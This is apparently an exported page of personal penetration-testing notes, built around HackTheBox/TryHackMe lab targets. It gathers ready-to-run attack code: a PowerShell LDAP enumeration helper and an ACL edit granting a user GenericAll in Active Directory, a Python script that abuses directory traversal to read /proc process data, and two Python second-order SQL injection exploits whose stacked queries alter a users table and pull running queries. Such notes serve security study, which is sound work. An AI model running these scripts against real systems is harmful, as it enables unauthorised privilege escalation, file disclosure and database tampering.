<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Code</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Code</h1><br/><p><h1>Powershell</h1></p><p></p><p><a name="LDAPSearch"></a><h2>LDAPSearch</h2></p><p>[Windows 58]</p><p>See <a href="PrivEsc--Windows--Active_Directory_10.html#Nested Groups">Nested Groups</a> for more info. You can import <strong>charon.ps1</strong> to execute the listed commands.</p><p></p><p>function LDAPSearch {</p><p>    param (</p><p>        [string]$LDAPQuery</p><p>    )</p><p></p><p>    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name</p><p>    $DistinguishedName = ([adsi]&#39;&#39;).distinguishedName</p><p></p><p>    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(&quot;LDAP://$PDC/$DistinguishedName&quot;)</p><p></p><p>    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)</p><p></p><p>    return $DirectorySearcher.FindAll()</p><p></p><p>}</p><p></p><p>&lt;#</p><p>To use, 1st: &#39;Import-Module .\charon.ps1&#39; </p><p>___</p><p><strong>Basic usage examples</strong></p><p>You can use a decimal value to specify search target (e.g. the 1st example lists users)</p><p></p><p>LDAPSearch -LDAPQuery &quot;(samAccountType=805306368)&quot;</p><p>LDAPSearch -LDAPQuery &quot;(objectclass=group)&quot;</p><p>___</p><p><strong>List Group Membership (Obj props &amp; attrs)</strong></p><p></p><p>foreach ($group in $(LDAPSearch -LDAPQuery &quot;(objectCategory=group)&quot;)) {$group.properties | select {$_.cn}, {$_.member} | Format-List}</p><p>___</p><p><strong>Specify Group</strong></p><p></p><p>$sales = LDAPSearch -LDAPQuery &quot;(&amp;(objectCategory=group)(cn=Sales Department))&quot;</p><p>$sales.properties.member</p><p></p><p><strong>Specify Nested Group Parent</strong></p><p><strong>[ ! ] Tip</strong>: use “List Group Memberships”, then CTRL+F for “CN=Sales” to find the Parent group for “Sales”</p><p></p><p>$group = LDAPSearch -LDAPQuery &quot;(&amp;(objectCategory=group)(cn=Development Department*))&quot;</p><p>$group.properties.member</p><p>___</p><p><strong>User Properties</strong></p><p></p><p>$acct = LDAPSearch -LDAPQuery &quot;(&amp;(objectCategory=user)(cn=jen))&quot;</p><p>$acct.properties | Format-List</p><p>#&gt;</p><p></p><p><h2>ACL Edit</h2></p><p>Impacket is a more reliable <a href="PrivEsc--Windows--Sysadmin_Stuff--ACL_+_ACE_97.html#ACLs in AD">method</a>. See <a href="PrivEsc--Windows--Active_Directory_10.html#Shadow Credentials Attack">Shadow Credentials</a> Attack for Impacket usage.</p><p></p><p><h3>Use GenericOwner to get GenericAll</h3></p><p># 1. Bind to the AD object</p><p>$Target = [ADSI]&quot;LDAP://CN=Certification Authority,CN=Users,DC=sequel,DC=htb&quot;</p><p></p><p># 2. Get existing ACL</p><p>$acl = $Target.ObjectSecurity</p><p></p><p># 3. Get SID for &quot;ryan&quot;</p><p>$ryan = New-Object System.Security.Principal.NTAccount(&quot;sequel\ryan&quot;)</p><p>$ryanSID = $ryan.Translate([System.Security.Principal.SecurityIdentifier])</p><p></p><p># 4. Create ACE for GenericAll</p><p>$rights = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll</p><p>$type = [System.Security.AccessControl.AccessControlType]::Allow</p><p>$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None</p><p></p><p>$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(</p><p>    $ryanSID,</p><p>    $rights,</p><p>    $type,</p><p>    $inheritanceType</p><p>)</p><p></p><p># 5. Apply new ACE and commit changes</p><p>$acl.AddAccessRule($rule)</p><p>$Target.ObjectSecurity = $acl</p><p>$Target.CommitChanges()</p><p></p><p># 6. Verify Changes (With PowerView)</p><p>#Get-ObjectAcl -Identity &quot;CN=Certification Authority,CN=Users,DC=sequel,DC=htb&quot; -ResolveGUIDs | ? {$_.IdentityReference -like &quot;*ryan*&quot;}</p><p></p><p>#Instead of PowerView, can try the following. However, AD:\ works only if the ActiveDirectory module + RSAT are set up and the AD drive is mounted. </p><p>#(Get-Acl &quot;AD:\CN=Certification Authority,CN=Users,DC=sequel,DC=htb&quot;).Access</p><p></p><p><h1>Python</h1></p><p><a name="Enumerate Linux Services"></a><h2>Enumerate Linux Services (Dir Trav, LFI, or RCE)</h2></p><p>BF the PID for a <a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#SVC Enum via Dir Trav / LFI">service</a> running on a specified port using LFI, Dir Trav or RCE.</p><p></p><p><h3>Edits</h3></p><p>Setup for Dir Trav using <strong>/?page=../../../../</strong>. Edit as needed</p><p></p><p>May also need to increase the PID range.</p><p></p><p><h3>Code</h3></p><p>#!/usr/bin/env python3</p><p>import requests</p><p></p><p>def read_file(base_url, path):</p><p>    file_url = f&quot;{base_url}/?page=../../../../{path}&quot;</p><p>    try:</p><p>        response = requests.get(file_url)</p><p>        if response.status_code == 200:</p><p>            return response.text</p><p>        else:</p><p>            return None</p><p>    except Exception as e:</p><p>        print(f&quot;Error reading {path}: {e}&quot;)</p><p>        return None</p><p></p><p>def find_pid_by_port(base_url, port):</p><p>    for pid in range(1, 5000):  # Adjust the range based on the expected number of PIDs</p><p>        print(f&quot;PID: &quot; + str(pid))</p><p>        cmdline_path = f&quot;proc/{pid}/cmdline&quot;</p><p>        cmdline = read_file(base_url, cmdline_path)</p><p>        if cmdline:</p><p>            if str(port) in cmdline:</p><p>                return pid</p><p>    return None</p><p></p><p>base_url = input(&quot;Enter the URL (e.g. http://airplane.thm:8000): &quot;)</p><p>port = input(&quot;Enter the port to use for SVC Enum: &quot;)</p><p>pid = find_pid_by_port(base_url, port)</p><p>if pid:</p><p>    cmdline = read_file(base_url, f&quot;proc/{pid}/cmdline&quot;)</p><p>    status = read_file(base_url, f&quot;proc/{pid}/status&quot;)</p><p>    print(f&#39;PID using port {port}: {pid}&#39;)</p><p>    print(f&#39;Command line: {cmdline}&#39;)</p><p>    print(f&#39;Status: {status}&#39;)</p><p>else:</p><p>    print(f&#39;No process found using port {port}&#39;)</p><p>    </p><p><a name="Extract Running Queries"></a><h1>SQLi: Extract Running Queries</h1></p><p>[CTF D 4-8]</p><p></p><p>In this case, the payload is your username &amp; it gets triggered when you visit your homepage after Auth. </p><p></p><p>These <a href="SQL--DBMS--MySQL_+_MariaDB_17.html#Extract Current Queries">scripts</a> register an account at <strong>register.php</strong>, then authenticate as that user at <strong>login.php</strong> which triggers the payload. (See Notes for breakdown of each line)</p><p></p><p><h2>Stacked Queries</h2></p><p>#!/usr/bin/env python3</p><p></p><p>import requests</p><p>import re</p><p>import time</p><p>import sys</p><p></p><p>url_base = sys.argv[1]</p><p></p><p># modify the data type for the id column</p><p>s = requests.session()</p><p>payload = f&#39;&quot; UNION SELECT 1,2; ALTER TABLE web.users MODIFY id VARCHAR(255); ALTER TABLE web.users DROP PRIMARY KEY;#&#39;</p><p>s.post(url_base + &quot;register.php&quot;, data={&quot;username&quot;: payload, &quot;password&quot;: &quot;jxf&quot;, &quot;submit&quot;: &quot;Submit Query&quot;})</p><p>s.post(url_base + &quot;login.php&quot;, data={&quot;username&quot;: payload, &quot;password&quot;: &quot;jxf&quot;, &quot;login&quot;: &quot;Submit Query&quot;})</p><p>s.get(url_base)</p><p></p><p># create and log in with an account to update the id column with the current queries if it is not empty</p><p>s = requests.session()</p><p>payload = f&#39;&quot; UNION SELECT 1,2; UPDATE web.users SET id=(SELECT IFNULL(GROUP_CONCAT(INFO_BINARY),&quot;1&quot;) FROM information_schema.PROCESSLIST WHERE INFO_BINARY NOT LIKE &quot;%INFO_BINARY%&quot;) WHERE username=&quot;admin&quot;;#&#39;</p><p>s.post(url_base + &quot;register.php&quot;, data={&quot;username&quot;: payload, &quot;password&quot;: &quot;jxf&quot;, &quot;submit&quot;: &quot;Submit Query&quot;})</p><p>s.post(url_base + &quot;login.php&quot;, data={&quot;username&quot;: payload, &quot;password&quot;: &quot;jxf&quot;, &quot;login&quot;: &quot;Submit Query&quot;})</p><p></p><p># constantly update the id field by fetching the last logins page and if it is not set to 1, print it and exit</p><p>while True:</p><p>    r = s.get(url_base)</p><p>    if &quot;User 1 - admin&quot; not in r.text:</p><p>        print(re.search(r&quot;User (.*) - admin last logins&quot;, r.text).group(1))</p><p>        </p><p>        # after successful extraction, clean up the database</p><p>        payload = f&#39;&quot; UNION SELECT 1,2; DELETE FROM web.users WHERE username LIKE &quot;%UNION SELECT 1,2%&quot;; UPDATE web.users SET id=&quot;1&quot; WHERE username=&quot;admin&quot;; ALTER TABLE web.users MODIFY id INT PRIMARY KEY AUTO_INCREMENT;#&#39;</p><p>        s = requests.session()</p><p>        s.post(url_base + &quot;register.php&quot;, data={&quot;username&quot;: payload, &quot;password&quot;: &quot;jxf&quot;, &quot;submit&quot;: &quot;Submit Query&quot;})</p><p>        s.post(url_base + &quot;login.php&quot;, data={&quot;username&quot;: payload, &quot;password&quot;: &quot;jxf&quot;, &quot;login&quot;: &quot;Submit Query&quot;})</p><p>        s.get(url_base)</p><p></p><p>        break</p><p></p><p>    time.sleep(1)</p><p></p><p><h2>UNION-based Exploitation</h2></p><p>#!/usr/bin/env python3</p><p></p><p>import requests</p><p>import sys</p><p>from bs4 import BeautifulSoup</p><p>import threading</p><p>import time</p><p></p><p>url_base = sys.argv[1]</p><p>payload = sys.argv[2]</p><p></p><p>sessions = {}</p><p>results = {}</p><p></p><p></p><p>def create_and_login(i, sqli_payload):</p><p>    s = requests.session()</p><p>    s.post(url_base + &quot;register.php&quot;, data={&quot;username&quot;: sqli_payload, &quot;password&quot;: &quot;jxf&quot;, &quot;submit&quot;: &quot;Submit Query&quot;})</p><p>    s.post(url_base + &quot;login.php&quot;, data={&quot;username&quot;: sqli_payload, &quot;password&quot;: &quot;jxf&quot;, &quot;login&quot;: &quot;Submit Query&quot;})</p><p>    sessions[i] = s</p><p>    return</p><p></p><p></p><p>def fetch_query_result(i):</p><p>    r = sessions[i].get(url_base)</p><p>    soup = BeautifulSoup(r.text, &quot;html.parser&quot;)</p><p>    tables = soup.find_all(&quot;table&quot;, class_=&quot;u-full-width&quot;)</p><p>    output = tables[1].find(&quot;td&quot;).get_text()</p><p>    results[i] = output</p><p>    return</p><p></p><p></p><p>threads = []</p><p>for i in range(15):</p><p>    sqli_payload = f&#39;&quot; UNION SELECT 1, SUBSTR(({payload}), {i * 16 + 1}, 16);#&#39;</p><p>    thread = threading.Thread(target=create_and_login, args=(i, sqli_payload))</p><p>    threads.append(thread)</p><p>    thread.start()</p><p></p><p>for thread in threads:</p><p>    thread.join()</p><p></p><p>while True:</p><p>    threads = [threading.Thread(target=fetch_query_result, args=(i,)) for i in range(15)]</p><p>    for thread in threads:</p><p>        thread.start()</p><p>    for thread in threads:</p><p>        thread.join()</p><p></p><p>    # check that we are not missing any part of the result</p><p>    if all([len(results[i]) &lt;= len(results[i - 1]) for i in range(1, 15)]):</p><p>        result = &quot;&quot;.join([results[i] for i in range(0, 15)])</p><p>        if len(result) &gt; 16:</p><p>            print(result)</p><p>            sys.exit(0)</p><p>            </p><p>    time.sleep(1)</p></div>
</body>
</html>
